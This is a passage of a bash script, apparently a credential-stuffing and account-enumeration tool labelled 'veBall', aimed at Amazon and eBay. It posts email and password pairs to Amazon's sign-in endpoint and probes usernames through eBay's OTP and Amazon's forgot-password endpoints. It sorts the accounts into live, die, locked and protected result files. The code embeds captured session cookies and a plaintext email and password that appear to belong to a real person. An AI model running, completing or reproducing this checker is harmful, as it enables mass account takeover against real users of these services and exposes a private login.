Fb92h1eMVGbPkwks7hibsVwfNuWaA9dcXjauOMTOxJB090QC9Eybmo2N9Kr%2BUPaokguRN%2BV%2BZ3%2B3OC%2FqPjO0T1HxFmXwDW8wWOyEFUHcbltsZJ4%2FRz0wJ3GbAknEDm9bMj1UokxqfRecpYCszHVtCfkT2EGqij5LZknfesIxc2x%2B3MRS58riYjrgjGtsJ1RgtEaenK2PDdFmL0zlZg7EDxLOIAS7LB40uG5iI2l0GJbZ3efx4GTiNzNfOR0ZClvN0G09I5a2jnpQpCcstlVlPJttPbQFim9UkaM%2Fkm2xNH9o2hjOdDNhYuGGKuHicwEJb5Ck10F9doRSPyhJdxDFXl37k1gZBU5NQUvoI%2BJ7hiH3xsoknkH2rRkrV9jwFK6rb2MkC0PvcznKUD5uvEqutKqZULuUHvprm%2FtDdR4v%2B7qz32WPo665IU9Ty%2BIIhsGAIlXI0njz22yj6gvvdmrRg3jVTjaxFTQ64Z0jlYlAXZgYNPr45rRJdLcPGTW7kPf6OHmtSJ1oGKVNOwYNl29SBIHUQgsdjIfxMCI5Z2BLCC5MERgOKxwnAyyEBAG8Uac0UdhEEaLo%2FOM3podfgdPcRPJLC7vW6lt%2BEPb8GJhbeJ6ECXnXNO4%2FGiKAhXH6Jrhf6POltdB1q421BtCUK8YNJgb17VbVam0kSHTS6fSvMnmKMuEfKougofAUfO9bDnR6ONGR2cKF8LCPj0hwQXQ3TEV%2BKsZmBJMjTpo%2FGjgm8JkO9C2aiZWYSE67Wf2HEo3cx1W6jPC%2Fda3lS3EzyTQdF3h7irHkv1VFDgLhrWV8cB83HRBbmmcXBhUAPQT528ti7CUVohY%2BpQACi9wb%2B%2B31TUXczq8a7KaX5hEOTBcmyYhzcSQg3be1o%2Fp0Rf9qoS5u9FkszLwWnuKN3nvHySDdKrI8o2qWNdmLyWdggE%2Bxftosnk83TuC%2BII6k7DnF6l4mWZxMXnrKpkujXZEcz8andmYiLZpTXrBr3U1BwQb9FTlcvYuJuorN56rhjpFsEnxAnQ36xlG8LzQ%2FQJRn4L5E9upb4RFGsjHZTV0efA2AgP8HspTlef%2FPUURpwMrngtN%2BkPnkKLbthr9li4TQAZwOtQVNJv9m2T6bbMj1Pvra2H129Dj3udp%2FMe5PRBpGuHwlbbB4Ub%2BRnbaXgPSs90x55v6C61W3xQ6oQOw8n2MHq6SQ6a94vSOjL%2BTZP8eyIDX5caJyiQy0SFAbwJXgOyIsnyGf%2FntlA1Nx5R2sZbCUGOuExI%2BVQJocJyWlkbyHFI1bgpTZ%2FFey%2FAsx9%2FKZ8dfNH3r3RTQuCdA%2B%2B2FMpFmlhOv4WdVoRt3W38xjYCZmNIwIXOqpDAqmEORTIUa73PfmF8nYX2m1QeHttzL33dRVSGfJOc3oOJZUjJM9Hi69EOgCaO5L1QIpxFA8W8jUHEKIneJ13u8MvFpE%2FknAq89sLKjyAufDzo%2FjwDXN60buUJNYDFvOGsTPb5QKyge3nlguCZ8BGu4tKnV6Ntjnlr1AZwV%2F9uIWk6sTHdjNAI3tk59%2BfAOVp%2FwKOxHpTEig%2FOGoLh14%2BwY4D6dP4r7TY4Vxbzn6%2Bk7OO5xjEXfFi%2B476GtrtZf0rY%2BARKIlQX%2Fuh7SdFz3StA4pv0FOQPORHU2%2B0Dv1ulj9wXw6PJhe91t%2FDcf2XOHlhKID3Uvz8eYEHB4PyHEtsDdG9lYgT1mn4al8%2Bpkz2R2%2FTOJQKJJChtgdHafSjWhNmYtGhTskH0YTc1LCIyKqkpmpnI3MyrpCBHEgj%2BOkQNOJlocKNSXSE00zkobTWpnh91cCtGmZk65OyciCmkSb6xrZ3PCoiDXnxfmMr%2BD8UDgedJ%2FvOfTRc362iL4nAMur2263sYJwqONapb7HqNTAQmkSPmc6D0E5X%2FADPzQ%2FzP1uryKfB%2BaWMqupPmhIcdiwlrT5zH5yfF9jkNDapvQU2aF7zdQBmxNWHl%2FM8ISefYEGLVZVyZuThFfgJ2YVAgPZK0SXq%2FqDcQWuBtlgLs%2FYamKaREXlxnW%2Fkd9sT8yVbUTpXKApUe12lQqL93%2FH9TCnuwMlWesyj4j6fa8JrtqLXulrhGXM9J61YDbA6RGTHk%2BKLiVrVmtKZ3HG7vMFsh7abpCpDPa7lfUzEmDLwUl7CkBFeNtTwFBWpAGAuvH8aHYVWQAqtkKuoJPxxz9iZz3PmXKf6QxR3FyS57wYBCvao%2FqnO3hHTKlXK%2FjO4H3dSDEWZDMRw7J4RN%2B5rUYRGjvXW13Wvsy1jTjng5UMJP4ZxQuPTYTEa%2BobWX789g04VXZ%2BtqOYMiWRR3DqON9S6157%2BkL6pI5LhZ6Z%2BhfKoGfIt9LHFmxV2FYPPAnuIVjCcq4XkjnirEvi98euGG0M62GAGUj4S3hyUBRT3QG9ztoKl%2BrSB3BhIubMuEMXEd2fzTZzTT%2B9K5uonwps2oTuvEVAwphCIgfMvr%2BAhifG3WYvGM0k8VX1XS0SfXl3yF%2BgZymJ6vPBIm4Co5hsD2eZE%2BUKzJf%2FVCfLwGKZt8vGYRvesGQ1f1jclipgu2irCYL0gco9wIMjm%2BIEEHT%2ByWX8YVDl05v7B7jVNSpRXEyXqUVxLpvaUP8XpDbsngSEKcieA0cRR1yeeLzJYKS3bhm5UBOgCJuqCBNWTJYfwB3TltNxLYFfIXvoU4YAS%2BMI%2F%2BIwZ1xCoOVWfXWVC5yDF%2FQRJZBsEEwlcXQtkc%2Bkdc8RmVcv8jdDDfAawXl9Tw40vi%2FJgUhynDY6i83Qyl4KztvH%2FiThy2ebLLIf%2FzcMlzlD565M81fSsq9VfkJKJJSQ4pXDQaw8R%2B0fI1qJfwoGRuNlBVqii7Wzc2DAb1m93kyiqJHUas0oMtBLXAo2x%2FFyYv52Tr8Oqfd9Hs1p%2BpCTeFTPhmnFbRYRhDosM72e7Ukw5Rq3UKYMkvLRoxxtzOvDISqRRHiGbNN1GuggxHliia8OHJJBgFmPNuNofYWylWX%2BlQ4AGjHfEIBlCe2%2FDS8dffhtpfb76bJcJEGhWy33mBGhHdV80dlMYQcumd%2BgFasQSpp%2FvTOhm17AwcyUIQEX%2Fo0YJCGkgmOGx%2Fuzscr8s%2BW5zLVsv8dBtRNFoVDAcojSIPn%2F6ZKAUcFO6vXQSJlp%2FFUc4Swke%2FwLuOHRmrrXspeW2r9be2w%2BVJlYIZrbYs76o60QAULgZJiC1kUjZwfiQ2PmhGS6NSUjf%2FpNKhJQVwFyMJvHIBDOyBZloKEmEb9FgjeGAWZuhOtFK4S1eegzddUhOw1wZ2E6H43EjED1bNZfH7X4ZGT2ebP3f6gN%2BVDJj0i71k1HO9O7xmiJhgeh17HsKOLjUwuCyGWRcj9%2BixmBc9WqpIKkUpaEdZQoZolwD0d7Fl085sXZLQKrCCd1Yc%2FypjLbenSteBFLqtEhPBpQ%2BluZzcJQHGHbdoAjChIM4TC4p5QwVW%2BlQ5oLhK4yWbkBlSnd1qinkTErP0gh2zqnW06a5YzAlDLjRp3jP3MgjWm3z%2FT3GEKnwjzyv61W5Gq%2FfSnQddizDKtX57t09I4qaYcCMSZkstb6M37Jyjual5M1I5ilZ9tNLLTcBi4gtP%2BeBPDdQRQ622CfGPYyDQ%2Bb8K2BgnXONXQ0KmnVtAuJsv1ScwUCwTopi1wcOfkPQ91Y9gMz2O4DWG8uCKZo5omr%2BAJBpmy033fuox6ytTBx%2B0B7aoeaHWr9OINKP7khfqgEBxlcXu54cYAAPD6fcghxZjwWDhbSrPBE6bb6kBoA6XTk1L6H%2FLjDyp%2B%2BYAFgZVHK0bJeFu%2FHGiPiPrnhQXIypoGEyHw3zMkMkqcC1Bxa3MD17VpVnnN9gdjCH5M1anPIVd9rNkewsAMf2FpwFoP0uLGZECFAokw9kW0fqjvUhWh3PZBs%2FDbguDrlBdnGD%2BQLJNwse%2BP6R%2FFfrJtifDemB3A4n%2F0NlsmXp5aadFCZokJfHfs4JFixBRaSTL2vuAWgHd5I4xGRo%2Bj%2F%2FogFKizMddQ%2Fk4uvw5AdDiuoJKv6Ra8fGIj2f6LG019rzUE0JFd7zsEcZUnjxX6lu0blvL185aaweQmqMHOxFc8cOD2aUpR6e%2BOxDDIX0WsZqBWS77WyfCDB5gJbWVU2jG4BVDZ9xKpRTNZorEDtkibBcPgliguk0jWsWgjYvNNElFt7qi4exVcxPNOPSlfeUQ0T6rpQSe7v5btUm1OEC2OAcnHYGgvj55apC%2F2p4KDmnCUgI7ljQK06zSrb6Xnp7Scke8G%2Ffo411C%2BcUMIxN5FpxjpItOue0Tpb5uBmEq569jgv4ZVAwya%2F%2FrqO%2BVMDxWfohR15%2FLl1Bq3VSLTXaDtDjpTiT9577K6kjsEJclxgqIbUkcbL9QgXd1JOebJ7CwUPnjWzzQOmPHKGLU4rCHwBpaP9EmsdxgikFUy%2BHcUqLYSSmamS%2BQGu3vZvH0kgtXR%2BJZ%2BN7Qmm0H%2BEpujs1lEECRSZjogYXNt9eFvhM5yslUQvlwaseNHU50bb1JzstxyeOhZIbVNzPdONYSaN5cwK1f4oF%2BdVMCL%2BpXZCVvWzD4fV%2BsQGzO0T5ELuxExer3vDJXMTUdISfsfLAsMrnCbNhHr8kXBbUT2apWXXubPXWQSMzvbko%2FjgPmzopQxrgpfGkcqfQdUf1uJzNyHLmDEPUgjvzjM94998cDi3hKZLOxwnOmnSEvc7MVdLAsfvyKlv4ZzFTQ6DvpIJoGuS1wZDrt9Mz3PHltApxlYZm%2BsSguekqB52%2BXPeSwd81BUH47efhGY0juh1aGQSzkeG8E%2FgtzV20k1tkqpOshY4QWERDrbJtzLdPYhZnWzHBl2B2h263QmZQc2iB1%2F5358IOFGxmNkOjE2sYU37NEwOaFMd3nzR109keEAeQvy6uceEOeaUGa7CU%2FpkqzLKDwrFrq6hqsnCutwcQ6yUpujdd9TCA8%2BuPgbRfHWbYczWmc9D%2FUGSnrhapFOYQOi0P53N7AqQifAGEzoEfmY5%2BxbMLuqTDSZyyxa7q6VPam1bcKZOMCuhTVHVecbuzIaFOAx1X7qB%2FJ3ELFDZ8s71ZzJbqSZmyY4MDoVqP02mUnULvVBP5sFpYkXCLFe7Wmye6C%2FD6LBA7Kt%2FeGvtmt43fGNi1xMSQ9mwz6jR6c3a%2BymwccBWstioPXNFbKzVi5L2R4ivjyuGyO%2F91YlKUY%2FROjP8mefo0bk%2BJrEHIBioyJ8qwCAh15VHA%2B1HItNe9WCoeYA%2B0sgGIhVmy9VlNFFg3sNxjwc6zDuhY7z3tIUH75TVyWbN1XMneleAm6tGPuWgSf58PKExIMjF7SsAOL2FFKTgJ6Y7Z0TX5HQUVFySI7s1ikhDWyqDpjNLaYHKUCvHWxBhf%2BrqeR5qXD%2B2WB1Eev6LHFTUqQ231%2Bx41ErAUFQWX2r%2FDpyA5GvGDN1A1brsIdrasAstrjIOgy0VfCl%2FT1sBq9WsiAn6Y94XhZb8OtEeXhkB01y96QNFmESBsabNYJaKTvn2MhUAoYEWTSNOhZ62FZwS7j6SgATg3Q%2BRC0g0R%2BBtKIQqE1FjAzLouIDF30zTQ7jlJqjLKmexFEUaHyjqstNV0RiqM5j9x9adOv9dmt8gxGoGbAmg7vWV7XiJ%2B7bBSyf6mGMOWfxiF04f8Nz32eApMrnrwe0SvAyTBuZA56yffVqYX9x%2FKiMHVmGH5cWTK0Npe%2F1z9qfUKs5WYPhMJud7PgoMbr%2F3ixPCdICLLCVzh6IVnfQJaFF2ZVX0p8ftSXKZZpFqL%2F%2FdgtMRipwuaN9OEgiPhVi4sl8FgrrETENmnS6H1mxE9%2BDbU75iGl1P%2BTI2Fxs89FSvHeyncwtBPQC1BFfcux7wTC3VEDUiBzj1k3pG%2Fn0%2FTvXf1mzJD7S3DqSLlblR%2F72M1RzQzVgzcpH7RzHKBUyC5ElL76OfED%2FqZJx%2BRYBvqC%2Fs3W2M%2Fo8aQmS7yrQo6c9JFoZTa0F3hR4gIpkQ%2BUxxBI%2B7xqFekf320n5zd9onkm8DqB7W%2F%2FGMXPehaFf9l0b%2FvILAt5%2F%2B2crPSXkqWaAHr1LbdXVECylMLUQouas5%2B7pVTz133f4gVxUYB08Y9Wc%2B4d1JDxh4jgwVL%2F274AJZ1ieDEff6rECamfQ7jUeyDAI%2FLETJJ4VL%2FJHJgsOG4NYApoSRfWKQzN3cV%2FaOUVrcvgtjxRB4LEPddljhBsAeof%2F3TJzzWvRqO2TfIU%2FOMYciQQ0nIoYGBqPNJVbb1g7yw%2B%2BCztmr5wzAfPYeNuqO4%2BUwhWuCXufRlEOcXTApcVbkUL7zUWPK%2BXMlGO1JZQuWof5lEM%2B3mD7w3s73xj9tm6xDXWyM%2BQ2jzOfysVZYU1vxJe%2FGwwM0VFnhIimZTQHZUkZU7FK7%2B7ac8tCQ72lv4Evj9YGuk%2FE34HFbNn21K9gn31ho5bP2uoVKS0R1TrKN0WCmmDBS6PlRTsk7dLnhaDGjQ8AWur6IGJxpN6F3%2FdDD5d1JDu2jX8ZOlqf3wcKqdV0f8%2FZJx4AWdjUG8a7LMu9FBiWvNR13M3LrzKy7AzYyTjCo1HMVRjugYL0hSVh58t2AX0ZWjO9CBPEdWBLJwWfYjaQIoQIpQOPKi4%2FHSPICvTbucDivuuXHapDisMiUIZhZw9%2BWpHKE8GVaPIwayS30DOUTiDbQshYlFUl%2F06YvdbA%3D%3D&openid.identity=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q%3D&pageId=ape%3AdXNmbGV4&openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNvbS9ncC95b3Vyc3RvcmUvaG9tZT9pZT1VVEY4JmFjdGlvbj1zaWduLW91dCZwYXRoPSUyRmdwJTJGeW91cnN0b3JlJTJGaG9tZSZyZWZfPW5hdl95b3VyYWNjb3VudF9zaWdub3V0JnNpZ25Jbj0xJnVzZVJlZGlyZWN0T25TdWNjZXNzPTE%3D&prevRID=ape%3ARjRIUDFBTk1NTTBFMUhQUEIxQ04%3D&openid.assoc_handle=ape%3AdXNmbGV4&openid.mode=ape%3AY2hlY2tpZF9zZXR1cA%3D%3D&openid.ns.pape=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvZXh0ZW5zaW9ucy9wYXBlLzEuMA%3D%3D&prepopulatedLoginId=ape%3AZXlKamFYQm9aWElpT2lJNFkzRjZTVE5ZV0RBM2RtaHBUaTl5UW5keVJtTXpObWhJZVc4elNHODBPSFZYV2xoS2VUVk9ZVE5aUFNJc0lrbFdJam9pYUZaaWNUSktPVTF2VkZWM2QxWTNOMjlsSzNOSVp6MDlJaXdpZG1WeWMybHZiaUk2TVgwPQ%3D%3D&custId=ape%3AQTJIWU5MQjgxV1VXWkY%3D&openid.claimed_id=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q%3D&openid.ns=ape%3AaHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA%3D&email=michaeljek22%40gmail.com&email=michaeljek22%40gmail.com&password=iqbalpro123' --compressed -s`
            grab=$(echo "$posted" | grep -ic "Your password is incorrect")
            grab2=$(echo "$posted" | grep -ic "Please Enable Cookies to Continue")
            grab4=$(echo "$posted" | grep -ic "To better protect your account")
            grab3=$(echo "$posted" | grep -ic "Your recently viewed items")
            grab5=$(echo "$posted" | grep -ic "Verification needed")
            if [[ $grab > 0 ]]; then
                printf "${YELLOW}[$header] ${PINK} $7 Line left => ${RED}DIE [!] $2 ${CYAN} $footer"
                echo "$2":"$3" >> $5/die.txt
            elif [[ $grab3 > 0 || $grab2 > 0 || $grab5 > 0 ]]; then
                printf "${YELLOW}[$header] ${PINK} $7 Line left => ${GREEN}LIVE [!] $2 ${CYAN} $footer"
                echo "$2":"$3" >> $5/live.txt
            elif [[ $grab4 > 0 ]]; then
                printf "${YELLOW}[$header] ${PINK} $7 Line left => ${BLUE}PROTECTED [!] $2 ${CYAN} $footer"
                echo "$2":"$3" >> $5/protected.txt
            else
                printf "${YELLOW}[$header] ${PINK} $7 Line left => ${YELLOW}UNKNOWN [!] $2 ${CYAN} $footer"
                echo "$2":"$3" >> $5/unknown.txt
            fi
        fi
        printf "\r"
    fi
}
validator() {
    if [[ $1 == 1 ]]; then               
        SECONDS=0
  
        posted=`curl 'https://www.ebay.com/signin/srv/otp' -H 'origin: https://www.ebay.com' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.9' -H 'x-requested-with: XMLHttpRequest' -H 'cookie: ak_bmsc=79AA0C21013BD43EB89A4515C17BD526244311A70A140000EDC64D5C9FB15E62~plKerG7s57b9HhnYzRGL3jfFBpqX9/sVOns9ukXbnFqs/O4NikHrfC3u1dTAdHxok3Vj26voNuPMY/8kmK+n6V8ncL4vW4lRSc+ox6t6cgzxZpglHzVSOt7w7vzAVCgzLNfssGxbvw/67gJJsWSINtA46LkvyU01UqMSfeDnQ9kMjWcz2qNE+nqxk7K2MwUq2GZRjUfYYFUZYNirzB4hg8LJAJGYjJ6CJIFvUbOPZkto8=; cid=W9ETmyAJXnj3oFzQ%231382040403; dp1=btzo/1a45c4dd518^u1p/QEBfX0BAX19AQA**5e2efa88^bl/ID60102e08^pbf/%23200000000000000000000000000045e2efa88^; s=CgAD4ACBcTxiIOGZkMTEwYjgxNjgwYWMxYTIzNDg2M2E4ZmZmZTRjODS+DG/E; nonsession=BAQAAAWgWKMkCAAaAADMABV4u+og3ODExMQDKACBls8iIOGZkMTEwYjgxNjgwYWMxYTIzNDg2M2E4ZmZmZTRjODQAywABXE3OFDhG8wAO/tKiFlUzYqjaTFj9IWvsEw**; bm_sv=A33355C10B466F646DA5909E4738535C~2F/uAjrTyIgqTDxDQdH4mSCpkh562lMiRLeRt3D1ddcAmKx38LyKq3k7q529BCtaa5k+i2MRpeDdABfcWy5KTgoz17gkfeaDwGkEkAPUYlOIupRAsJwUvHcvN70MsWDuDSrwcasw21N6lkHC4a+Gsg==; ebay=%5Ejs%3D1%5Edv%3D5c4dc6f1%5Esbf%3D%23100000%5E; npii=btguid/8fd110b81680ac1a234863a8fffe4c845e2efa93^cguid/8fd12c4f1680aa1a26979d02fb8cd2455e2efa93^' -H 'pragma: no-cache' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' -H 'accept: */*' -H 'cache-control: no-cache' -H 'authority: www.ebay.com' -H 'referer: https://www.ebay.com/signin/?otpFyp=1' --data 'username='$2'&sendCode=false' --compressed -s -L`
        duration=$SECONDS

        grab=$(echo "$posted" | grep -ic "That's not a match")
        live=$(echo "$posted" | grep -ic "The number we have")
        live2=$(echo "$posted" | grep -ic "We ran into a problem")
        locked=$(echo "$posted" | grep -ic "For your security")
        header="veBall Version 1"
        footer="[Ebay Validator]\n"
        
        if [[ $grab == 1 ]]; then
            printf "${YELLOW}[$header] ${PINK} $6 Line left => ${RED}DIE [!] $2 ${CYAN} $footer"
            echo "$2" >> $4/die.txt
        elif [[ $live == 1 || $live2 == 1 ]]; then
            printf "${YELLOW}[$header] ${PINK} $6 Line left => ${GREEN}LIVE [!] => $2 ${CYAN} $footer"
            echo "$2" >> $4/live.txt
        elif [[ $locked == 1 ]]; then
            printf "${YELLOW}[$header] ${PINK} $6 Line left => ${BLUE}LOCKED [!] => $2 ${CYAN} $footer"
            echo "$2" >> $4/locked.txt
        else
            printf "${YELLOW}[$header] ${PINK} $6 Line left => ${YELLOW}UNKNOWN [!] => $2 ${CYAN} $footer"
            echo "$2" >> $4/unknown.txt
        fi
        printf "\r"
    elif [[ $1 == 2 ]]; then
        SECONDS=0
        
        posted=`curl 'https://www.amazon.com/ap/forgotpassword' -H 'authority: www.amazon.com' -H 'pragma: no-cache' -H 'cache-control: no-cache' -H 'origin: https://www.amazon.com' -H 'upgrade-insecure-requests: 1' -H 'content-type: application/x-www-form-urlencoded' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'referer: https://www.amazon.com/ap/forgotpassword' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.9' -H 'cookie: aws-priv=eyJ2IjoxLCJldSI6MCwic3QiOjB9; aws-target-static-id=1544257171334-120218; aws-target-data=%7B%22support%22%3A%221%22%7D; s_fid=76B27CD7E6E6F54F-1FD017AB3D56833E; regStatus=pre-register; session-id=143-1516341-7296102; session-id-time=2082787201l; ubid-main=132-4672412-4045862; sst-main=Sst1|PQEDjiFVTWr0bQwMfK8UF9BQC4uZ45eibaobXL8QrL-TcDL0gadFvuhSv32EjKvKnZmz6UbP3IqLKfpCq7y2vxjbgQ5wauccjdD9GAv6q3ZBI247e9Xr5xZBK-gQvjgWBlDRF-teUnjpK2GW4SWX_vqIiOV3tDnW0eD39hyqj5PjEZ87tkZRUoNrQvHe5_6YotWTIpyz1T00t2B-rHFrQYHi0E9FR554wZXqX5zG7Icm4x499kO14TKcgBUnngRoo2vYaQwWZz7CoEi7m4f701pmn2-_OahdTrYIPQe48MUrzpDHC3bkum_wRZdC5AZtxsAPpa-9_gz4t19YIdQfGIs_DA; x-wl-uid=1VNCZB2gGgpVSq+mmNSvXdj7i5OjPT4OXxBLnt6EjK6L0N88HirWxKnlaHUhK/ihr5oLYb0HJRzEOkGViOUkgnQ==; s_vn=1575793172158%26vn%3D5; aws-target-visitor-id=1544257171346-510914.29_1; s_dslv=1548335792167; s_nr=1548335792171-Repeat; session-token="YIBE71FKNwX0c1ZI9WWZSeR6+EwV7K68s9Ioqw9cdFAbBzJjqAsqGmiEcC8Uvk0Hylv7GMbVjeBKqbTuS3TAzQbCxSDM/xb0tOcB/WcViRe8HzXGBrxr03Dj1g3aBEtBnGwNYw9fl61lX8ork4FDIWQfuAKumM8EWext6haGJzoGxAmtTuNlZ/t8Uegw6+um7wxcIPltqJ8Ml+iNRrIU5w=="; skin=noskin; i18n-prefs=USD; csm-hit=adb:adblk_no&t:1548601313313&tb:2X9V2YBY23EVB7G81A87+s-KQFM0JQ5J0G7YE4P7JHF|1548601313313' --data 'openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNvbS8%2FX2VuY29kaW5nPVVURjgmb3BmX3JlZGlyPTEmcmVmXz1uYXZfeWFfc2lnbmlu&prevRID=ape%3AS1FGTTBKUTVKMEc3WUU0UDdKSEY%3D&metadata1=ECdITeCs%3Ah7UiUp076Lt8L494ADgASvaXzrS0ORUj8Et9iTmqKUAwcrMMnQjzOWkCYx1b5sdxVsZZktYeAUomcgov0WjU0UfvyyQC064%2BVWZeajlhVnDzBgHKD%2Bd9u8eMatjAPSnp888635rytKvy8jUm%2BJigo%2BN9Hus%2BVlR8ua8zDcnlwNSgPX6l%2BOkoxaJ9p0CFeB5XxZrYxdC47QxPtahPqIdkD13FedOcqt%2FnOF21kPm4GYe7T4qH30PvC0a6f5vvK6vbUijt8hMMQi0y5YxReR9vhlzyi68q2LZ4CqucWQL36qR5eAorp2EPDXroe40HohDZ%2F7GNv5%2BNlXdh8EYWvKslPBcDW29p1sIR%2B4AyQcabkbbWjKqrI9bz9mu0D%2FK7nVss%2BtF%2FDKnuDzGib%2FeJGkIAxgDrHTT8HLaAKN62TLysmK%2FCEGgJYAX7FiIXZIcsda73Q87ZB9Q0MSL5NQ908pX4vjZEsVHbyJVgUnOnffeEzJIYA1yFrcHGF0%2BCYlZHyNtFaLCBRjsTJwBvBDVSdikx5uOn4kqvRul5diUddoC%2F1vKDxhKwkESJkQRtcj1fqxmagxzey0XSVACQyl2%2FiTV%2FimTjk%2BVP5hX13s3INNQRAWXdNu7rv7YLU0uFb8lDKIPjmzlYRs2d%2BidKJpClvGPjdB%2BAhVydSrpQK0UqHG5BrB6g7i9Pli3usny1JRZD5Ac4vQDyc1ubDnI2aJ6w7gZotCfynmZTDocX8YqKBzeDBX06VtNqMaCaDTCTBsDAgpqV2l3gDfQcwNdc1GIyQiAFIgtq6TsX4E5gH8pCZk3UASV28RauS7QOovHrUDNeSW6VQfLIYxTos3W9uX39UDQvbaqIEZww7f398YU9%2BVnDl9TS5r0YaQJD4D%2FvgFCcmEQvCQdUUiV2i%2BAYp7R5wHXR7ooOj%2BDQJKROa%2B5BzXxIG4SSYdXn9wY43HOu%2Ftxz4cRDiiuVoBfYq63SWbQxBZRy86mG8rnYJejChygX85gsrTCKAzU85FGE8ub4N9fGrbz0vYMGkFznc%2FUWC3PnGy%2BKAqnxYmZWzkM3Mjo7M0%2BcLNGtjcuoU4gxryE8D2WfPN%2FU5wFxc29Tbyx02GBEiA1nUFVGCsjm6dhC0NBZsU2KAUu09UnVeb0eH2MmLLljrFlCCLIWWeRKEt%2BnIRSGg5UqntvlLcwv5Dm0Ouhnf%2FlaTsOgPknkSZP7lE5DOudRwEASeAU3f0jgK2uWSAtke6bjRhzxeuR7jcN4SRYDI2Ef8gluH9ynUX6dUiOCBxxXVDQgmp6s9MoDF%2FWN1kSirjYvoyT%2BiDSDfnpNvd4J5I5hAdMXl%2FPg9nvAmWNWl4gKKVPX34kCZXt4aJPOq6jy%2FEab%2BJ2l6SAHjSwm0qGOdymwu9geez1JmWwwSHuRYRgD20yjiqqTRo3Y6ie6qzrNOgZ3Mv2cNAf%2F4KjRGjNDEvyhDvMFxFQOCbq91fo62360kSZjYfb1EaemyA4GENgjKgm2bA10nD7DM0G0D4jm2Cfj94NCjpF7u%2FyzA1FxYECVfSJB9TPSUCcpAwON1LuSUk67IWo%2FcGuo8i9d%2FG%2BVE%2BgT8J6YPtrscO52WIu2NGl0yTysG%2F6iQjIvw9KwUXXDrR6w8lI0nyP%2Fk0EVfGqq%2BIZg9xZ5ymn0pm1eiV80r6h7TctNUOhlx%2Be6hk4SOxg07OSZK%2F9kaVjLlmQHBiwbyxkaFW3Yq1kdEp9KDBLx4wGL9W98%2F%2Ftddq%2FQMVlcuWiW3nPXem8%2F9vbEfpz83dt4JVXuELa%2FzHd1E1NA0yk%2F%2F1olKwHfHgXB%2BAb6Zig4FrTOuqwl2KKk%2FoDjmYYEvXGjpFleK5cikuLkWSW%2B8gDIDTKLAq4IOqDy12CJNJC6097HvK6K3Oy1hgH9YquypGSWrCZUhZTnbEgqeaMH60QdkNGAM8LWbROcZCUDhen3id0KO8z4kgN%2BnLQliO8jawcNm9batbl2%2FfA5mSdr77G4tVfmyyIebQJJeNPEipk2bEznRBEVE5YBtk49U%2F4cc5QawuehUkHARsPGff7Gk2jnN3MEz7Iw5LLhkXEdtGeYzDi855L%2FcwX21pyY7J8Xv36oAJrClVbvLLGidDWZhsst9HnEdiQpCie%2B6FxETYJ1o0a6RfGBGIaJZjkqIurt9mci0RZDVgWWhwHe1HuLpGrqHymdouCMX0NCqyFz97N7%2FCTrZIkqpG9t1JHFVR48itC5Rjixp7xA9jtyTOCXxP5w2vWQPTvVBsUYYRMQgldv9olr3ep%2BW6KrhCccDFnAtIqSqSIGGm9ospRfyVhsbDDU58xSWHWl51sPZSwjZ1pmGdM80M1IflAwfVq2RGtj3NwNmGGdHTqHTIP67gfhhIo0JZBHP%2BIWA0qhPCfuCbvtYfl%2BPtW76tyIb0WDh1NtzxXoameC1w4yYAdHF0ZWbeTzEnlQFWNjT%2BMsWvzLASJ23dwbMMtWcC56RxHmBOjVuCZvAK%2B%2BI4fVTHngrZRqyKtWNZti1asTWwfalJ5nm2mNe24f6EHTk%2FTkMlVo5y%2BqA%2BhclZMgXjg%2F0nQ4x5mrmCUa%2FI1GvpgRoreqk%2BsUkmJ60ktPsdjHmO9pA3BWYGZPvXnTt1zUfpQKQsk0tOF7imOk5AyZPva7rTobsArC%2BHJPBSnJNC3F1pyGC7senIG2%2FhxIpYQGrxFNb4UAfxPorAF1ZJm%2BX%2FylM0NCiftwfk7wdLD%2FaLYVTWVTNJ3w%2FUptwtKKKfCZJmpGJ1L9gI0WJM0qzzoov8WpBV%2FxeobdjTYh274OEHdRHfd4%2FtFSqhhAdsLsV0QrWIdfhbLU15%2BlTVqcsbwnvZu93HVqq0qDxzOzQgGJvPeHz1RcUBOTDQX%2BnXf9CoELuGH%2FZJGDxGMjGdnW98kHCrLf056XPLWwxT6azjl%2BgmN9zGID7F75h1KHk5gqImhWH4LGb2N25Eez6LIwq8T3R%2FBAW%2Bn8vcuejSVZM4hNGyn%2BWnc0K701JT31R6edZH4A3TG6B9B5QRqspGqA5er%2BQqwdYc41PqulAo97AqfYS%2BXusohhkkfXtgS%2BZ%2F7uYJeGg38BIjR2BrCr5fmVOlhCHOVU5VdP1WTeuJtGn5Pal1wJYooeWenJeYElzbKK5b4%2BGUI3oBm2hDPiuiUnEXXxcfzuE0Zx0Mh0WKVcR3WxL8DibNzJqd%2F7QcavWRP%2Fzq2PiZh99J4sV%2BE3bP6k2c1DYyglxaxvV0n6chEcJbtvsBGDWSGvikF1YkGqg1q7rMYb4JhL9FnqKlsPCyuDui9eXfFm%2FmZToPDI%2BQEi19slWoAbs8DXxwaCKQcrsjjd%2FHt14vSTQ3QXLQrCEdwV5bmCJ69ghY%2BQk8%2B0e9e8u5hamyIAzK7IT2pdH%2Brrp1bfzeyoaNJVkqG3J5PYkmHpRTkWbmEcyKjt%2F9y6M81SiVKAbha94GGwbJmERgOa45oQffkGGBOIfD8G90hVh%2BDivJwJbkOcqk6bk4HzbJDf7Q%2BhymJef6cfaq5L8uZ2gpH327S1ImLGERaLYI3iAW